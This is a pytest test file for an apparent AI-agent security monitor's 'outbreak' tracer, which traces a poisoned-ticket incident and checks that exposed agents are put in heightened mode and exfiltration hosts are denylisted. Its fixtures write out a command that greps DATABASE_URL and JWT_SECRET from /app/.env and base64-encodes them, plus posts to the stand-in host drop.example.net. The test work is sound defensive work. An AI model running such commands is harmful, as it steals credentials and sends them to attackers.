"""detection.outbreak: trace() over a scripted FakeCH, and run_outbreak() against Bindu's real checkpoint app
in-process (checkpoint.app.create_app with InMemoryWriter, ch_enabled=False, httpx.ASGITransport).

No ClickHouse, no sockets, no model calls. Run: uv run pytest tests/unit/test_outbreak.py -q
"""

from __future__ import annotations

import asyncio
from typing import Any

import httpx
import pytest
from typer.testing import CliRunner

from checkpoint.app import create_app
from checkpoint.policy import host_of as checkpoint_host_of
from checkpoint.writer import InMemoryWriter
from detection import outbreak as OB
from detection.outbreak import host_of, incident_window, run_outbreak, trace, trace_with_receipts
from tests.unit.conftest import make_settings
from tripwire.contracts import AlertPayload, Incident, IncidentStep, Outbreak, Policy

ATTACKER = "deploy-bot"
EXPOSED = "support-bot"
SOURCE = "ticket:4821"
T0 = 1_791_569_120_000
SQL_NAMES = ("outbreak_source", "outbreak_untrusted_read", "outbreak_exposed", "outbreak_destinations")
TOKEN = make_settings().tripwire_token


def step(ts_ms: int, action: str, target: str, result: str = "ok", reason: str = "") -> dict[str, Any]:
    return {"ts_ms": ts_ms, "action": action, "target": target, "result": result, "reason": reason}


INCIDENT: dict[str, Any] = {
    "id": "inc-unit",
    "agent_id": ATTACKER,
    "rule": "secret_theft",
    "opened_ms": T0 + 3_000,
    "last_step_ts_ms": T0 + 2_700,
    "steps": [
        step(T0 + 900, "read_file", "/app/.env"),
        step(T0, "read_file", SOURCE),  # out of order on purpose: the window starts at the earliest step
        step(T0 + 1_800, "run_command", "grep -E '^(DATABASE_URL|JWT_SECRET)=' /app/.env | base64 -w0"),
        step(T0 + 2_700, "http_post", "https://drop.example.net/upload"),
        step(T0 + 3_300, "read_file", "/app/config.yml", "denied", "blocked"),
    ],
}

SOURCE_ROWS = [{"source_id": SOURCE, "n": 4, "last_ms": T0 + 3_300}, {"source_id": "ticket:1", "n": 1, "last_ms": T0}]
EXPOSED_ROWS = [
    {"agent_id": EXPOSED, "n": 3, "first_ms": T0 - 60_000, "last_ms": T0 - 58_000},
    {"agent_id": ATTACKER, "n": 5, "first_ms": T0, "last_ms": T0 + 3_300},  # SQL excludes it; Python must too
    {"agent_id": "agent-07", "n": 1, "first_ms": T0 - 3_600_000, "last_ms": T0 - 3_600_000},  # synthetic history
    {"agent_id": "", "n": 1, "first_ms": T0, "last_ms": T0},
]
DEST_ROWS = [
    {"target": "https://drop.example.net/upload", "n": 1, "last_ms": T0 + 2_700},
    {"target": "https://DROP.example.net:443/upload2", "n": 1, "last_ms": T0 + 2_800},  # same host, dedup
    {"target": "https://status.internal.example/v1/updates", "n": 2, "last_ms": T0 + 2_900},  # internal
    {"target": "paste.example/raw?x=1", "n": 1, "last_ms": T0 + 2_950},  # bare host
    {"target": "", "n": 1, "last_ms": T0},
]


class FakeCH:
    """Scripted rows per outbreak SQL name (list, callable(params) -> list, or an Exception to raise).

    Each query sleeps delay_s so the measured query_ms is > 0 like a real round trip."""

    def __init__(self, scripts: dict[str, Any] | None = None, delay_s: float = 0.001) -> None:
        self.scripts: dict[str, Any] = dict(scripts or {})
        self.delay_s = delay_s
        self.calls: list[tuple[str, dict[str, Any]]] = []

    async def query(self, sql: str, parameters: dict[str, Any] | None = None) -> list[dict[str, Any]]:
        name = next((n for n in SQL_NAMES if f"detection/sql/{n}.sql" in sql), None)
        assert name is not None, f"unexpected SQL: {sql[:80]!r}"
        self.calls.append((name, dict(parameters or {})))
        if self.delay_s:
            await asyncio.sleep(self.delay_s)
        script = self.scripts.get(name, [])
        if isinstance(script, Exception):
            raise script
        if callable(script):
            return script(parameters or {})
        return [dict(r) for r in script]

    def names(self) -> list[str]:
        return [n for n, _ in self.calls]

    def params(self, name: str) -> dict[str, Any]:
        return next(p for n, p in self.calls if n == name)


def attack_ch(**extra: Any) -> FakeCH:
    scripts = {
        "outbreak_source": SOURCE_ROWS,
        "outbreak_exposed": EXPOSED_ROWS,
        "outbreak_destinations": DEST_ROWS,
        "outbreak_untrusted_read": [{"source_id": "ticket:9001", "ts_ms": T0}],
    }
    scripts.update(extra)
    return FakeCH(scripts)


# ---------------------------------------------------------------------------
# trace()
# ---------------------------------------------------------------------------


async def test_trace_finds_source_exposed_agents_and_external_hosts():
    ch = attack_ch()
    ob, receipts = await trace_with_receipts(INCIDENT, ch=ch)
    assert isinstance(ob, Outbreak)
    assert ob.source_id == SOURCE
    assert ob.exposed_agents == ["agent-07", EXPOSED]  # sorted; attacker and blank ids dropped
    assert ob.blocked_destinations == ["drop.example.net", "paste.example"]  # internal host dropped, host dedup
    assert ob.query_ms > 0
    assert ch.names() == ["outbreak_source", "outbreak_exposed", "outbreak_destinations"]  # no fallback query
    # the parameters the SQL files document
    assert ch.params("outbreak_source") == {"agent": ATTACKER, "since_ms": T0}  # earliest step, not steps[0]
    assert ch.params("outbreak_exposed") == {"agent": ATTACKER, "source": SOURCE, "window_h": 72}
    assert ch.params("outbreak_destinations") == {"agent": ATTACKER, "since_ms": T0}
    # one receipt per query, and query_ms is their measured sum
    assert [r["sql"] for r in receipts] == ch.names()
    assert all(r["ms"] > 0 for r in receipts)
    assert ob.query_ms == pytest.approx(sum(r["ms"] for r in receipts), abs=0.01)
    assert [r["rows"] for r in receipts] == [len(SOURCE_ROWS), len(EXPOSED_ROWS), len(DEST_ROWS)]


async def test_trace_accepts_a_contracts_incident_model_and_custom_window():
    inc = Incident.model_validate(INCIDENT)
    ch = attack_ch()
    ob = await trace(inc, ch=ch, window_h=6)
    assert ob.source_id == SOURCE and ob.exposed_agents == ["agent-07", EXPOSED]
    assert ch.params("outbreak_exposed")["window_h"] == 6


async def test_trace_falls_back_to_the_latest_untrusted_read_when_nothing_is_tainted():
    ch = attack_ch(outbreak_source=[])
    ob = await trace(INCIDENT, ch=ch)
    assert ob.source_id == "ticket:9001"
    assert ch.names() == ["outbreak_source", "outbreak_untrusted_read", "outbreak_exposed", "outbreak_destinations"]
    assert ch.params("outbreak_untrusted_read") == {"agent": ATTACKER, "window_h": 72, "prefixes": ["ticket:", "http_get:"]}
    assert ch.params("outbreak_exposed")["source"] == "ticket:9001"  # exposure is traced for the fallback source


async def test_trace_uses_the_policy_prefixes_and_internal_hosts():
    policy = Policy(untrusted_sources=["ticket:", "email:"], internal_hosts=["paste.example", "Status.Internal.Example"])
    ch = attack_ch(outbreak_source=[])
    ob = await trace(INCIDENT, ch=ch, policy=policy)
    assert ch.params("outbreak_untrusted_read")["prefixes"] == ["ticket:", "email:"]
    assert ob.blocked_destinations == ["drop.example.net"]  # paste.example is internal under this policy
    # a policy with an empty prefix list still traces with the contract defaults
    ch2 = attack_ch(outbreak_source=[])
    await trace(INCIDENT, ch=ch2, policy=Policy(untrusted_sources=[]))
    assert ch2.params("outbreak_untrusted_read")["prefixes"] == ["ticket:", "http_get:"]


async def test_trace_with_no_evidence_returns_empty_lists_and_skips_the_fleet_scan():
    ch = FakeCH({"outbreak_untrusted_read": []})
    ob = await trace(INCIDENT, ch=ch)
    assert ob == Outbreak(source_id="", exposed_agents=[], blocked_destinations=[], query_ms=ob.query_ms)
    assert ob.query_ms > 0
    assert "outbreak_exposed" not in ch.names()  # nothing can match an empty source
    assert ch.names() == ["outbreak_source", "outbreak_untrusted_read", "outbreak_destinations"]


async def test_trace_propagates_clickhouse_errors_to_the_caller():
    with pytest.raises(RuntimeError, match="Connection refused"):
        await trace(INCIDENT, ch=attack_ch(outbreak_source=RuntimeError("Code: 210. Connection refused")))


def test_incident_window_picks_the_earliest_step_then_the_fallbacks():
    assert incident_window(INCIDENT) == (ATTACKER, T0)
    assert incident_window(Incident.model_validate(INCIDENT)) == (ATTACKER, T0)
    assert incident_window({"agent_id": ATTACKER, "last_step_ts_ms": 5, "opened_ms": 9, "steps": []}) == (ATTACKER, 5)
    assert incident_window({"agent_id": ATTACKER, "opened_ms": 9}) == (ATTACKER, 9)
    assert incident_window({"agent_id": ATTACKER, "steps": [{"ts_ms": "oops"}, {"ts_ms": 0}]}) == (ATTACKER, 0)
    with pytest.raises(ValueError, match="agent_id"):
        incident_window({"id": "inc-1", "steps": []})
    with pytest.raises(TypeError):
        incident_window("inc-1")  # type: ignore[arg-type]


def test_host_of_agrees_with_the_checkpoint_policy_rule():
    cases = [
        "https://drop.example.net/upload",
        "https://DROP.example.net:8443/x?y=1",
        "http://api.internal.example/v1/deployments",
        "paste.example/raw",
        "localhost:8000/status",
        "ftp://files.example.org",
        "",
        "   ",
        "not a url",
        "https://[::1]:8080/",
        "https://",
    ]
    for t in cases:
        assert host_of(t) == checkpoint_host_of(t), t
    assert host_of("https://DROP.example.net:8443/x") == "drop.example.net"
    assert host_of("paste.example/raw") == "paste.example"
    assert host_of("") == ""


# ---------------------------------------------------------------------------
# run_outbreak() against the real checkpoint app (in-process)
# ---------------------------------------------------------------------------


def tool(agent: str, action: str, target: str, tainted_by: str = "", payload: str = "") -> dict[str, Any]:
    return {"agent_id": agent, "action": action, "target": target, "bytes": 100, "tainted_by": tainted_by, "payload": payload}


def alert(last_step_ts_ms: int) -> dict[str, Any]:
    return AlertPayload(
        rule="secret_theft",
        verdict="malicious",
        confidence=0.95,
        reason="test",
        decision_source="akashml",
        detected_at_ms=last_step_ts_ms + 500,
        last_step_ts_ms=last_step_ts_ms,
        model_ids=["akash/test-small"],
        latency_ms=120.0,
        tokens_in=300,
        tokens_out=20,
    ).model_dump()


async def open_incident(client: httpx.AsyncClient) -> str:
    """Replay the poisoned-ticket shape through POST /tool, then quarantine the attacker via POST /block."""
    h = {"X-Tripwire-Token": TOKEN}
    for call in (
        tool(EXPOSED, "read_file", SOURCE),
        tool(EXPOSED, "read_file", "/var/log/app.log", SOURCE),
        tool(ATTACKER, "read_file", SOURCE),
        tool(ATTACKER, "read_file", "/app/.env", SOURCE),
        tool(ATTACKER, "run_command", "grep -E '^(DATABASE_URL|JWT_SECRET)=' /app/.env | base64 -w0", SOURCE),
    ):
        r = await client.post("/tool", json=call, headers=h)
        assert r.status_code == 200 and r.json()["result"] == "ok", r.text
    last = await client.post("/tool", json=tool(ATTACKER, "http_post", "https://drop.example.net/upload", SOURCE, "x"), headers=h)
    assert last.status_code == 200, last.text
    r = await client.post(f"/block/{ATTACKER}", json=alert(last.json()["ts_ms"]), headers=h)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["status"] == "blocked" and body["incident_id"].startswith("inc-")
    return body["incident_id"]


async def test_run_outbreak_applies_heightened_mode_and_denylist_on_the_real_checkpoint(client):
    inc_id = await open_incident(client)
    before = (await client.get("/policy")).json()
    assert "drop.example.net" not in before["denylist"]

    ch = attack_ch()
    ob = await run_outbreak(inc_id, client=client, ch=ch, token=TOKEN)

    assert ob is not None
    assert ob.source_id == SOURCE and ob.exposed_agents == ["agent-07", EXPOSED]
    assert ob.blocked_destinations == ["drop.example.net", "paste.example"] and ob.query_ms > 0
    # the incident window came from the real incident's steps (ring buffer rows for the attacker)
    inc = (await client.get(f"/incidents/{inc_id}")).json()
    assert inc["steps"] and ch.params("outbreak_source")["since_ms"] == min(s["ts_ms"] for s in inc["steps"])
    assert inc["outbreak"] == ob.model_dump()
    # the checkpoint applied it: exposed agents heightened (attacker stays quarantined), hosts denylisted
    status = (await client.get("/status")).json()
    assert status["modes"][EXPOSED] == "heightened" and status["modes"]["agent-07"] == "heightened"
    assert status["modes"][ATTACKER] == "quarantined" and ATTACKER in status["blocked"]
    policy = (await client.get("/policy")).json()
    assert {"drop.example.net", "paste.example"} <= set(policy["denylist"])
    assert policy["version"] == before["version"] + 1 and status["policy_version"] == policy["version"]
    # fleet protection: the exposed agent's post to the attacker's host is now refused by policy
    r = await client.post(
        "/tool", json=tool(EXPOSED, "http_post", "https://drop.example.net/upload", SOURCE, "hi"), headers={"X-Tripwire-Token": TOKEN}
    )
    assert r.status_code == 200 and r.json()["result"] == "denied", r.text


async def test_run_outbreak_posts_the_token_and_reads_the_live_policy(tmp_path):
    """PUBLIC=1: every mutating call needs X-Tripwire-Token; the policy's internal hosts come from GET /policy."""
    app = create_app(
        writer=InMemoryWriter(),
        settings=make_settings(public=True, tripwire_token="s3cret"),
        state_path=tmp_path / "state.json",
        ch_enabled=False,
        fixtures_dir=tmp_path,
        web_dist=None,
    )
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
        h = {"X-Tripwire-Token": "s3cret"}
        for call in (tool(ATTACKER, "read_file", "/app/.env", SOURCE), tool(ATTACKER, "run_command", "base64 x", SOURCE)):
            assert (await client.post("/tool", json=call, headers=h)).status_code == 200
        last = (await client.post("/tool", json=tool(ATTACKER, "http_post", "https://drop.example.net/u", SOURCE, "x"), headers=h)).json()
        inc_id = (await client.post(f"/block/{ATTACKER}", json=alert(last["ts_ms"]), headers=h)).json()["incident_id"]
        # paste.example is internal in this deployment's policy -> never pushed to the denylist
        policy = Policy(internal_hosts=["paste.example", "status.internal.example"])
        assert (await client.put("/policy", json=policy.model_dump(), headers=h)).status_code == 200

        assert await run_outbreak(inc_id, client=client, ch=attack_ch(), token="nope") is None  # 401 on the POST
        assert (await client.get(f"/incidents/{inc_id}")).json()["outbreak"] is None

        ob = await run_outbreak(inc_id, client=client, ch=attack_ch(), token="s3cret")
        assert ob is not None and ob.blocked_destinations == ["drop.example.net"]
        assert (await client.get("/status")).json()["modes"][EXPOSED] == "heightened"


async def test_run_outbreak_failure_paths_return_none_and_never_raise(client):
    inc_id = await open_incident(client)
    # unknown incident -> 404 -> None, nothing queried
    ch = attack_ch()
    assert await run_outbreak("inc-does-not-exist", client=client, ch=ch, token=TOKEN) is None
    assert ch.calls == []
    # ClickHouse error -> None, nothing applied
    assert await run_outbreak(inc_id, client=client, ch=attack_ch(outbreak_source=RuntimeError("CH down")), token=TOKEN) is None
    # overall timeout -> None
    slow = FakeCH({"outbreak_source": SOURCE_ROWS}, delay_s=0.5)
    t0 = asyncio.get_running_loop().time()
    assert await run_outbreak(inc_id, client=client, ch=slow, token=TOKEN, timeout_s=0.05) is None
    assert asyncio.get_running_loop().time() - t0 < 0.45
    assert (await client.get(f"/incidents/{inc_id}")).json()["outbreak"] is None
    assert (await client.get("/status")).json()["modes"].get(EXPOSED) != "heightened"
    # checkpoint unreachable -> None

    def down(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("connection refused", request=request)

    async with httpx.AsyncClient(transport=httpx.MockTransport(down), base_url="http://cp.test") as dead:
        assert await run_outbreak(inc_id, client=dead, ch=attack_ch(), token=TOKEN) is None


async def test_fetch_policy_falls_back_to_the_contract_default():
    def broken(request: httpx.Request) -> httpx.Response:
        return httpx.Response(500, text="boom")

    async with httpx.AsyncClient(transport=httpx.MockTransport(broken), base_url="http://cp.test") as c:
        assert await OB.fetch_policy(c, token="t") == Policy()
        assert await OB.fetch_incident(c, "inc-1", token="t") is None


def test_cli_rejects_bad_arguments_and_exits_1_when_the_checkpoint_is_unreachable():
    runner = CliRunner()
    for args in (["inc-1", "--window-h", "0"], ["inc-1", "--timeout-s", "0"]):
        res = runner.invoke(OB.app, args)
        assert res.exit_code == 2, (args, res.output)
    # nothing listens on this throwaway port: trace cannot run -> exit 1 (no traceback)
    res = runner.invoke(OB.app, ["inc-1", "--no-write", "--checkpoint-url", "http://127.0.0.1:18998", "--timeout-s", "3"])
    assert res.exit_code == 1, res.output
    assert "Traceback" not in (res.output or "")


def test_contract_models_round_trip():
    ob = Outbreak(source_id=SOURCE, exposed_agents=[EXPOSED], blocked_destinations=["drop.example.net"], query_ms=4.2)
    assert Outbreak.model_validate(ob.model_dump()) == ob
    assert IncidentStep.model_validate(INCIDENT["steps"][0]).action == "read_file"
